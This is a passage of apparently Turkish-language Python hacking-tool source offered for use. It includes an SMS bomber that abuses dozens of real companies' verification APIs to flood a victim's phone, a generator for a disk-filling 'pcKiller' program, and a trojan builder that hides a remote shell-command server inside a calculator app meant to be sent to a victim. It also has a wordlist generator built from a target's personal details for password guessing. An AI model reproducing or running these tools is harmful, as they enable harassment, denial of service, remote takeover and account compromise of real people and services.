                return True, "Aygaz"
            else:
                return False, "Aygaz"
        except:
            return False, "Aygaz"

    def pawapp(number):
        try:
            url = "https://api.pawder.app/api/authentication/sign-up"
            payload = {
                "languageId" : "2",
                "mobileInformation" : "",
                "data" : {
                    "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                    "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                    "userAgreement" : "true",
                    "kvkk" : "true",
                    "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                    "phoneNo" : f"{number}",
                    "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
                }
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "PawAPP"
            else:
                return False, "PawAPP"
        except:
            return False, "PawAPP"

    def mopas(number):
        try:
            url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
            r = requests.post(url=url, timeout=2)
            
            if r.status_code == 200:
                token = json.loads(r.text)["access_token"]
                token_type = json.loads(r.text)["token_type"]
                url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
                headers = {"authorization": f"{token_type} {token}"}
                r1 = requests.get(url=url, headers=headers, timeout=2)
                
                if r1.status_code == 200:
                    return True, "Mopaş"
                else:
                    return False, "Mopaş"
            else:
                return False, "Mopaş"
        except:
            return False, "Mopaş"

    def paybol(number):
        try:
            url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
            payload = {
                "otp_code" : "null",
                "phone_number" : f"90{number}",
                "reference_id" : "null"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            
            if r.status_code == 200:
                return True, "Paybol"
            else:
                return False, "Paybol"
        except:
            return False, "Paybol"

    def ninewest(number):
        try:
            url = "https://www.ninewest.com.tr/webservice/v1/register.json"
            payload = {
                "alertMeWithEMail" : False,
                "alertMeWithSms" : False,
                "dataPermission" : True,
                "email" : "asdafwqww44wt4t4@gmail.com",
                "genderId" : random.randint(0,3),
                "hash" : "5488b0f6de",
                "inviteCode" : "",
                "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
                "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
                "registerContract" : True,
                "registerMethod" : "mail",
                "version" : "3"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            
            if r1 == True:
                return True, "Nine West"
            else:
                return False, "Nine West"
        except:
            return False, "Nine West"

    def saka(number):
        try:
            url = "https://mobilcrm2.saka.com.tr/api/customer/login"
            payload = {
                "gsm" : f"0{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["status"]
            if r1 == 1:
                return True, "Saka"
            else:
                return False, "Saka"
        except:
            return False, "Saka"

    def superpedestrian(number):
        try:
            url = "https://consumer-auth.linkyour.city/consumer_auth/register"
            payload = {
                "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["detail"]
            if r1 == "Ok":
                return True, "Superpedestrian"
            else:
                return False, "Superpedestrian"
        except:
            return False, "Superpedestrian"

    def hayat(number):
        try:
            url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
            r = requests.post(url=url, timeout=5)
            r1 = json.loads(r.text)["IsSuccessful"]
            if r1 == True:
                return True, "Hayat"
            else:
                return False, "Hayat"
        except:
            return False, "Hayat"

    def tazi(number):
        try:
            url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            payload = {
                "cep_tel" : f"{number}",
                "cep_tel_ulkekod" : "90"
            }
            headers = {
                "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Tazı"
            else:
                return False, "Tazı"
        except:
            return False, "Tazı"

    def gofody(number):
        try:
            url = "https://backend.gofody.com/api/v1/enduser/register/"
            payload = {
                "country_code": "90",
                "phone": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "GoFody"
            else:
                return False, "GoFody"
        except:
            return False, "GoFody"

    def weescooter(number):
        try:
            url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
            payload = {
                "tenant": "62a1e7efe74a84ea61f0d588",
                "gsm": f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Wee Scooter"
            else:
                return False, "Wee Scooter"
        except:
            return False, "Wee Scooter"

    def scooby(number):
        try:
            url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
            r = requests.get(url=url, timeout=5)
            if r.status_code == 200:
                return True, "Scooby"
            else:
                return False, "Scooby"
        except:
            return False, "Scooby"

    def gez(number):
        try:
            url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
            r = requests.get(url=url, timeout=5)
            r1 = json.loads(r.text)["succeeded"]
            if r1 == True:
                return True, "Gez"
            else:
                return False, "Gez"
        except:
            return False, "Gez"

    def heyscooter(number):
        try:
            url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
            headers = {"user-agent" : "okhttp/3.12.1"}
            r = requests.post(url=url, headers=headers, timeout=5)
            r1 = json.loads(r.text)["IsSuccess"]
            if r1 == True:
                return True, "Hey Scooter"
            else:
                return False, "Hey Scooter"
        except:
            return False, "Hey Scooter"

    def jetle(number):
        try:
            url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
            r = requests.get(url=url, timeout=5)
            if r.status_code == 200:
                return True, "Jetle"
            else:
                return False, "Jetle"
        except:
            return False, "Jetle"

    def rabbit(number):
        try:
            url = "https://api.rbbt.com.tr/v1/auth/authenticate"
            payload = {
                "mobile_number" : f"+90{number}",
                "os_name" : "android",
                "os_version" : "7.1.2",
                "app_version" : " 1.0.2(12)",
                "push_id" : "-"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["status"]
            if r1 == True:
                return True, "Rabbit"
            else:
                return False, "Rabbit"
        except:
            return False, "Rabbit"

    def roombadi(number):
        try:
            url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
            payload = {"phone": f"{number}", "countryId": 2}
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 200:
                return True, "Roombadi"
            else:
                return False, "Roombadi"
        except:
            return False, "Roombadi"

    def hizliecza(number):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
            payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSuccess"]
            if r1 == True:
                return True, "Hızlı Ecza"
            else:
                return False, "Hızlı Ecza"
        except:
            return False, "Hızlı Ecza"

    def signalall(number):
        try:
            url = "https://appservices.huzk.com/client/register"
            payload = {
                "name": "",
                "phone": {
                    "number": f"{number}",
                    "code": "90",
                    "country_code": "TR",
                    "name": ""
                },
                "countryCallingCode": "+90",
                "countryCode": "TR",
                "approved": True,
                "notifyType": 99,
                "favorites": [],
                "appKey": "live-exchange"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "SignalAll"
            else:
                return False, "SignalAll"
        except:
            return False, "SignalAll"

    def goyakit(number):
        try:
            url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
            r = requests.get(url=url, timeout=5)
            r1 = json.loads(r.text)["data"]["success"]
            if r1 == True:
                return True, "Go Yakıt"
            else:
                return False, "Go Yakıt"
        except:
            return False, "Go Yakıt"

    def pinar(number):
        try:
            url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
            payload = {
                "MobilePhone" : f"{number}"
            }
            headers = {
                "devicetype" : "android",
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.text == True:
                return True, "Pınar"
            else:
                return False, "Pınar"
        except:
            return False, "Pınar"

    def oliz(number):
        try:
            url = "https://api.oliz.com.tr/api/otp/send"
            payload = {
                "mobile_number" : f"{number}",
                "type" : None
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
            if r1 == "SUCCESS_SEND_SMS":
                return True, "Oliz"
            else:
                return False, "Oliz"
        except:
            return False, "Oliz"

    def macrocenter(number):
        try:
            url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
            payload = {
                "phoneNumber" : f"{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["successful"]
            if r1 == True:
                return True, "Macro Center"
            else:
                return False, "Macro Center"
        except:
            return False, "Macro Center"

    def marti(number):
        try:
            url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
            payload = {
                "mobilePhone" : f"{number}",
                "mobilePhoneCountryCode" : "90"
            }
            r = requests.post(url=url, json=payload, timeout=5)
            r1 = json.loads(r.text)["isSuccess"]
            if r1 == True:
                return True, "Martı"    #çalma kodumu oç buradan bileceğim insta bymer_ak
            else:
                return False, "Martı"
        except:
            return False, "Martı"

    def karma(number):
        try:
            url = "https://api.gokarma.app/v1/auth/send-sms"
            payload = {
                "phoneNumber" : f"90{number}",
                "type" : "REGISTER",
                "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
                "language" : "tr-TR"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 201:
                return True, "Karma"
            else:
                return False, "Karma"
        except:
            return False, "Karma"

    def joker(number):
        try:
            url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
            payload = {
                "phone" : f"{number}"
            }
            headers = {
                "user-agent" : ""
            }
            r = requests.post(url=url, headers=headers, data=payload, timeout=5)
            r1 = json.loads(r.text)["success"]

            if r1 == True:
                return True, "Joker"
            else:
                return False, "Joker"
        except:
            return False, "Joker"

    def hop(number):
        try:
            url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
            payload = {
                "phone" : f"+90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 201:
                return True, "Hop"
            else:
                return False, "Hop"
        except:
            return False, "Hop"

    def kimgbister(number):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            payload = {
                "msisdn" : f"90{number}"
            }
            r = requests.post(url=url, json=payload, timeout=5)

            if r.status_code == 200:
                return True, "Kim GB Ister"
            else:
                return False, "Kim GB Ister"
        except:
            return False, "Kim GB Ister"

    def anadolu(number):
        try:
            url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
            payload = urllib.parse.urlencode({
                "Numara": f"{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}"
            })
            headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            }
            r = requests.post(url=url, headers=headers, data=payload, timeout=5)
            if r.status_code == 200:
                return True, "Anadolu"
            else:
                return False, "Anadolu"
        except:
            return False, "Anadolu"

    def total(number):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        try:
            url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
            r = requests.post(url=url, verify=False, timeout=5)
            r1 = json.loads(r.text)["success"]
            if r1 == True:
                return True, "Total"
            else:
                return False, "Total"
        except:
            return False, "Total"

    def englishhome(number):
        try:
            url = "https://www.englishhome.com:443/enh_app/users/registration/"
            payload = {
                "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
                "phone": f"0{number}",
                "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
                "email_allowed": False,
                "sms_allowed": False,
                "confirm": True,
                "tom_pay_allowed": True
            }
            r = requests.post(url=url, json=payload, timeout=5)
            if r.status_code == 202:
                return True, "English Home"
            else:
                return False, "English Home"
        except:
            return False, "English Home"

    def petrolofisi(number):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            payload = {
                "approvedContractVersion": "v1",
                "approvedKvkkVersion": "v1",
                "contractPermission": True,
                "deviceId": "",
                "etkContactPermission": True,
                "kvkkPermission": True,
                "mobilePhone": f"0{number}",
                "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
                "positiveCard": "",
                "referenceCode": "",
                "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
            }
            headers = {
                "X-Channel": "IOS"
            }
            r = requests.post(url=url, headers=headers, json=payload, timeout=5)
            if r.status_code == 204:
                return True, "Petrol Ofisi"
            else:
                return False, "Petrol Ofisi"
        except:
            return False, "Petrol Ofisi"

    def send_service(number, service):
        global all_sends
        global success_sends
        global failed_sends
        result = service(number=number)
        if result[0] == True:
            all_sends += 1
            success_sends += 1
            print(f"[+] {all_sends} {result[1]}")
        else:
            all_sends += 1
            failed_sends += 1
            print(f"[-] {all_sends} {result[1]}")

    def send(number, amount, worker_amount):
        global clear
        global all_sends
        global success_sends
        global failed_sends
        start_time = int(time.perf_counter())
        functions = [a101, anadolu, aygaz, bim, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto]
        random.shuffle(functions)
        clear()
        print(f"{number} numarasına SMS gönderimi başlatıldı!\n")
        if amount == 0:
            with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
                i = 0
                while True:
                    executor.submit(send_service, number, functions[i % 49])
                    i += 1
                    if i == len(functions):
                        i = 0
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
                for i in range(amount):
                    executor.submit(send_service, number, functions[i % 49])
        print("\nGönderim tamamlandı!")
        print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi. {success_sends} başarılı, {failed_sends} başarısız.\n")
        all_sends = 0
        success_sends = 0
        failed_sends = 0
        restart()

    def watermark():
        print("SMS Tool by HeJo-1 ")

    def get_number():
        global clear
        while True:
            try:
                number = int(input(f"""Telefon numarasını yazın. Şunun gibi: "54xxxxxxxx" (Sadece Türkiye numaralarında çalışır!)\n[?] : """))
                if len(str(number)) == 10 and str(number)[0] == "5":
                    return number
                else:
                    clear()
                    print(f"Yanlış numara biçimi girildi.")
            except:
                clear()
                print(f"Lütfen bir numara yazın.")

    def get_amount():
        global clear
        while True:
            try:
                amount = int(input(f"""Kaç SMS gönderilsin? Sınırsız gönderim için "0" basın.\n[?] : """))
                if amount >= 0:
                    return amount
                else:
                    clear()
                    print(f"Girilen sayı 0'dan küçük olamaz.")
            except:
                clear()
                print(f"Lütfen bir sayı girin.")

    def get_worker_amount():
        global clear
        while True:
            try:
                worker_amount = int(input(f"Thread sayısını girin. Tavsiye edilen 5-100 arasıdır.\n[?] : "))
                if worker_amount >= 1:
                    return worker_amount
                else:
                    clear()
                    print(f"Girilen sayı 1'den küçük olamaz.")
            except:
                clear()
                print(f"Lütfen bir sayı girin.")

    def restart():
        global clear
        while True:
            question = input(f"Programdan çıkılsın mı?\n[Y/N] : ").upper().replace(" ", "")
            if question == "Y":
                quit()
            elif question == "N":
                clear()
                start()
                break
            else:
                clear()
                print(f"Yanlış tuşa basıldı!")

    def start():
        global clear
        clear()
        watermark()
        number = get_number()
        amount = get_amount()
        worker_amount = get_worker_amount()
        send(number=number, amount=amount, worker_amount=worker_amount)

    all_sends = 0
    success_sends = 0
    failed_sends = 0
    clear = lambda: os.system("cls")

    start()

def dork():
    
    def scrape_google_links(query_url, num_pages):
        all_links = set()

        for page in range(1, num_pages + 1):
            page_url = f"{query_url}&start={(page - 1) * 10}"
            response = requests.get(page_url)

            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                for anchor in soup.find_all('a'):
                    href = anchor.get('href')
                    if href.startswith('/url?q='):
                        link = href[7:href.find('&')]
                        all_links.add(link)

        return all_links


    query = input("Arama sorgusunu girin: ")
    num_pages = int(input("Araştırılacak sayfa sayısını girin: "))
    url = f"https://www.google.com/search?q={query}"
    links = scrape_google_links(url, num_pages)
    if links:
        output_file = input("Çıktı dosya adını girin (uzantısı olmadan): ")
        output_format = input("Çıktı formatını girin (txt veya excel): ")
        if output_format == 'txt':
            with open(f"{output_file}.txt", 'w') as file:
                for link in links:
                    file.write(link + '\n')
            print("Links saved to a txt file.")
        elif output_format == 'excel':
            wb = openpyxl.Workbook()
            ws = wb.active
            ws.title = "Links"
            for index, link in enumerate(links, start=1):
                ws.cell(row=index, column=1, value=link)
            excel_file = f"{output_file}.xlsx"
            wb.save(excel_file)
            print(f"Links saved to an Excel file: {excel_file}")
        else:
            print("Invalid output format. Supported formats: txt or excel.")
    else:
        print("No links found.")

def pcKiller():
    kod = '''
import random
def generate_random_data(size):
    return ''.join(chr(random.randint(0, 127)) for _ in range(size))
def create_large_text_file(file_path, size_gb):
    size_bytes = size_gb * 1024 * 1024 * 1024
    with open(file_path, 'wb') as file:
        while size_bytes > 0:
            chunk_size = min(size_bytes, 100 * 1024 * 1024)  # 100MB
            data = generate_random_data(chunk_size)
            file.write(data.encode('ascii'))
            size_bytes -= len(data)
if __name__ == "__main__":
    for i in range(1000):
        file_path = f"large_file_{i}.txt"
        size_gb = 1
        create_large_text_file(file_path, size_gb)
        print(f"{file_path} dosyası oluşturuldu ve içine yaklaşık 1GB veri yazıldı.")
            
'''
    print("[1] .py olarak kayot et\n[2] .exe olarak kayıt et")
    c = int(input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları/PcKiller/DosyaKayıtEtme$ "))
    if c == 1:
        ths = open("pcKiller.py", "w")
        ths.write(kod)
        print("Dosya 'pcKiller.py' olarak kayıt edildi")
        time.sleep(2)
    if c == 2:
        ths = open("pcKiller.py", "w")
        ths.write(kod)
        subprocess.run(["pyinstaller", "--onefile", "pcKiller.py"], check=True)
        print("'pcKiller.exe' olarak kayıt edildi")
        time.sleep(2)

def trojenOluşturucu():
    print("sen.py dosyası sizde kalacak o.py dosyayını hesef kişiye göndereceksiniz...")


    print("Host")
    host = str(input("> "))

    print("Port")
    port = str(input("> "))

    sen = f'''
    import socket

    host = '{host}'
    port = {port}

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    def send_command(message):
        if message != "":
            client_socket.send(message.encode())
            data = client_socket.recv(1024).decode()
            if message.startswith("ip"):
                print("IPv4 and IPv6 addresses:")
                print(data)
            else:
                print("Response from server: " + str(data))

    message = input(">> ")

    while message != "exit":
        if message.startswith("get"):
            # Dosya isteği yaparken sunucuya dosya adını bildirin
            client_socket.send(message.encode())
            file_data = client_socket.recv(1024).decode()
            print("File content:\n" + file_data)
        else:
            send_command(message)
        message = input(">> ")

    client_socket.close()
    '''

    o = f'''
    import threading
    import tkinter as tk
    import socket
    import subprocess as s

    # Hesap makinesi kodunu fonksiyon içine alalım
    def run_calculator():
        def button_click(number):
            current = entry.get()
            entry.delete(0, tk.END)
            entry.insert(0, str(current) + str(number))

        def button_clear():
            entry.delete(0, tk.END)

        def button_add():
            first_number = entry.get()
            global f_num
            global math
            math = "addition"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_subtract():
            first_number = entry.get()
            global f_num
            global math
            math = "subtraction"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_multiply():
            first_number = entry.get()
            global f_num
            global math
            math = "multiplication"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_divide():
            first_number = entry.get()
            global f_num
            global math
            math = "division"
            f_num = float(first_number)
            entry.delete(0, tk.END)

        def button_equal():
            second_number = entry.get()
            entry.delete(0, tk.END)
            if math == "addition":
                entry.insert(0, f_num + float(second_number))
            elif math == "subtraction":
                entry.insert(0, f_num - float(second_number))
            elif math == "multiplication":
                entry.insert(0, f_num * float(second_number))
            elif math == "division":
                entry.insert(0, f_num / float(second_number))

        root = tk.Tk()
        root.title("Hesap Makinesi")

        entry = tk.Entry(root, width=35, borderwidth=5)
        entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

        # Butonlar
        button_1 = tk.Button(root, text="1", padx=40, pady=20, command=lambda: button_click(1))
        button_2 = tk.Button(root, text="2", padx=40, pady=20, command=lambda: button_click(2))
        button_3 = tk.Button(root, text="3", padx=40, pady=20, command=lambda: button_click(3))
        button_4 = tk.Button(root, text="4", padx=40, pady=20, command=lambda: button_click(4))
        button_5 = tk.Button(root, text="5", padx=40, pady=20, command=lambda: button_click(5))
        button_6 = tk.Button(root, text="6", padx=40, pady=20, command=lambda: button_click(6))
        button_7 = tk.Button(root, text="7", padx=40, pady=20, command=lambda: button_click(7))
        button_8 = tk.Button(root, text="8", padx=40, pady=20, command=lambda: button_click(8))
        button_9 = tk.Button(root, text="9", padx=40, pady=20, command=lambda: button_click(9))
        button_0 = tk.Button(root, text="0", padx=40, pady=20, command=lambda: button_click(0))

        button_add = tk.Button(root, text="+", padx=39, pady=20, command=button_add)
        button_subtract = tk.Button(root, text="-", padx=41, pady=20, command=button_subtract)
        button_multiply = tk.Button(root, text="*", padx=41, pady=20, command=button_multiply)
        button_divide = tk.Button(root, text="/", padx=41, pady=20, command=button_divide)

        button_equal = tk.Button(root, text="=", padx=91, pady=20, command=button_equal)
        button_clear = tk.Button(root, text="Clear", padx=79, pady=20, command=button_clear)

        # Butonların konumları
        button_1.grid(row=3, column=0)
        button_2.grid(row=3, column=1)
        button_3.grid(row=3, column=2)

        button_4.grid(row=2, column=0)
        button_5.grid(row=2, column=1)
        button_6.grid(row=2, column=2)

        button_7.grid(row=1, column=0)
        button_8.grid(row=1, column=1)
        button_9.grid(row=1, column=2)

        button_0.grid(row=4, column=0)
        button_clear.grid(row=4, column=1, columnspan=2)

        button_add.grid(row=5, column=0)
        button_equal.grid(row=5, column=1, columnspan=2)

        button_subtract.grid(row=6, column=0)
        button_multiply.grid(row=6, column=1)
        button_divide.grid(row=6, column=2)

        root.mainloop()

    # İkinci kod parçası: Sunucu kodu
    def run_server():
        host = '{host}'
        port = {port}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))

        server_socket.listen(1)  # Bağlantıları dinle

        conn, addr = server_socket.accept()
        print("Connected from: " + str(addr))

        while True:
            data = conn.recv(1024).decode()
            print(data)

            if data == "exit":  # Eğer 'exit' mesajı alınırsa döngüden çık
                break

            if data.startswith("ip"):
                result = s.run("ip a", shell=True, capture_output=True)
                response_data = result.stdout
            elif data.startswith("get"):
                # Dosya adını alın
                file_name = data.split()[1]
                try:
                    # Dosyanın içeriğini okuyun ve istemciye gönderin
                    with open(file_name, 'r') as file:
                        response_data = file.read().encode()
                except FileNotFoundError:
                    response_data = "Dosya bulunamadı.".encode()
            else:
                result = s.run(data, stdout=s.PIPE, shell=True)
                if result.stdout.decode() != "":
                    response_data = result.stdout
                elif data.startswith("aç"):
                    dosya_adi = data[3:]
                    try:
                        with open(dosya_adi, 'r') as dosya:
                            response_data = dosya.read().encode()
                    except FileNotFoundError:
                        response_data = "Dosya bulunamadı.".encode()
                elif data.startswith("çalıştır"):
                    komut = data[9:]
                    try:
                        result = s.run(komut, stdout=s.PIPE, stderr=s.PIPE, shell=True)
                        if result.returncode == 0:
                            response_data = result.stdout
                        else:
                            response_data = result.stderr
                    except Exception as e:
                        response_data = str(e).encode()
                else:
                    response_data = "Command Error".encode()

            conn.send(response_data)

        conn.close()
        server_socket.close()

    # Her iki kodu da ayrı thread'lerde çalıştıralım
    calculator_thread = threading.Thread(target=run_calculator)
    server_thread = threading.Thread(target=run_server)

    # Thread'leri başlat
    calculator_thread.start()
    server_thread.start()
    '''

    with open("sen.py", "w") as dosya:
        dosya.write(sen)

    with open("o.py","w") as dosya1:
        dosya1.write(o)

    print("Bizi tercih ettiğiniz için teşekkürler\ntrojen'i yedirmede bol şans")

    print("trojen'i exeye çevirmek için 1 çıkmak için 1 dışında herhangi bir tuşa basın...")
    a = int(input(""))
    if a == 1:
        subprocess.run(["pyinstaller", "--onefile", "sen.py"], check=True)
        subprocess.run(["pyinstaller", "--onefile", "o.py"], check=True)
        print("Dosya başarıyla .exe'ye dönüştürüldü!")
    else:
        quit()

def webTarama():

    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)


    a = input("Aratılacak siteyi girin [https://example.com] : ")
    while not (a.startswith("http://") or a.startswith("https://")):
        print("Geçersiz URL, lütfen tekrar deneyin.")
        a = input("Aratılacak siteyi girin [https://example.com] : ")


    driver.get(a)


    clickable_elements = WebDriverWait(driver, 10).until(
        EC.visibility_of_all_elements_located((By.XPATH, "//a[@href] | //button"))
    )


    for element in clickable_elements:
        print(f"Text: {element.text},\nURL: {element.get_attribute('href')}")

    driver.quit()

def ipToİnformation():
    t.sleep(5)
    def check(): 
        r = requests.get("https://ipinfo.io/") 
        if r.status_code == 200: 
            print("\n[+] Sunucu Çevrimiçi!\n") 
        else: 
            print("\n[!] Sunucu Çevrimdışı!\n")
            exit()
    def get_device_name(ip):
        try:
            host_name = socket.gethostbyaddr(ip)
            return host_name[0]
        except socket.herror:
            return "Belirtilen IP adresi geçersiz veya cihaz adı bulunamadı."
    ip = input("Lütfen hedef ip giriniz: ") 
    check() 
    country = requests.get("https://ipinfo.io/{}/country/".format(ip)).text 
    city = requests.get("https://ipinfo.io/{}/city/".format(ip)).text 
    region = requests.get("https://ipinfo.io/{}/region/".format(ip)).text
    postal = requests.get("https://ipinfo.io/{}/postal/".format(ip)).text
    timezone = requests.get("https://ipinfo.io/{}/timezone/".format(ip)).text
    orgination = requests.get("https://ipinfo.io/{}/org/".format(ip)).text
    location =  requests.get("https://ipinfo.io/{}/loc/".format(ip)).text
    device_name = get_device_name(ip)

    print("İp: "+ip)
    print("Ülke: "+country)
    print("Şehir: "+city)
    print("Bölge: "+region)
    print("Posta Kodu: "+postal)
    print("Zaman Dilimi: "+timezone)
    print("Organizasyon: "+orgination)
    print("Lokasyon: "+location)
    print("Cihaz Adı: "+ device_name)

def wordlistOluşturucu():
    t.sleep(5)

    def generate_passwords(user_info, include_numbers=False):

        for r in range(1, len(user_info) + 1):
            for combination in itertools.permutations(user_info, r):
                password = ''.join(combination)
                yield password

                if include_numbers:
                    for number in range(10):
                        password_with_number = password + str(number)
                        yield password_with_number
    def save_passwords(passwords, output_file):
        with open(output_file, 'w', encoding='utf-8') as file:
            for password in passwords:
                file.write(password + '\n')

    name = input("Hedef kişinin adı: ")
    surname = input("Hedef kişinin soyadı: ")
    birth_year = input("Hedef kişinin doğduğu yıl: ")
    birth_month = input("Hedef kişinin doğduğu ay: ")
    birth_day = input("Hedef kişinin doğduğu gün: ")
    spouse_name = input("Hedef kişinin eşinin adı: ")
    spouse_surname = input("Hedef kişinin eşinin soyadı: ")
    pet_name = input("Hedef kişinin evcil hayvanının adı: ")
    hometown = input("Hedef kişinin memleketi: ")
    homeplak = input("Hedef kişinin memleketinin plaka kodu: ")
    onm = input("Hedef kişinin önem verdiği bir kelime: ")

    include_numbers_input = input("Sayı kombinasyonlarını eklemek ister misiniz? (Evet/Hayır): ")
    include_numbers = include_numbers_input.lower() == 'evet'

    user_info = [name, surname, birth_year, birth_month, birth_day, spouse_name, spouse_surname, pet_name, hometown, homeplak, onm]

    passwords = generate_passwords(user_info, include_numbers)

    output_file = "wordlist.txt"
    save_passwords(passwords, output_file)
    print(f'Şifreler {output_file} kayıt edildi.')

def dosyaŞifreleme():
    def anahtar_olustur():
        anahtar = Fernet.generate_key()
        with open("anahtar.key", "wb") as dosya:
            dosya.write(anahtar)
    def anahtar_yukle():
        with open("anahtar.key", "rb") as dosya:
            anahtar = dosya.read()
        return anahtar
    def dosya_sifrele(dosya_adi, anahtar):
        fernet = Fernet(anahtar)
        with open(dosya_adi, 'rb') as dosya:
            veri = dosya.read()
        sifreli_veri = fernet.encrypt(veri)
        with open(dosya_adi, 'wb') as dosya:
            dosya.write(sifreli_veri)
    def dosya_sifresini_ac(dosya_adi, anahtar):
        fernet = Fernet(anahtar)
        with open(dosya_adi, 'rb') as dosya:
            sifreli_veri = dosya.read()
        cozulmus_veri = fernet.decrypt(sifreli_veri)
        with open(dosya_adi, 'wb') as dosya:
            dosya.write(cozulmus_veri)
    dosya_yolu = input("Dosyanın adını ve yolunu girin: ")
    islem = input("İşlemi seçin (sifrele / ac): ")
    if islem == "sifrele":
        anahtar_olustur()
        anahtar = anahtar_yukle()
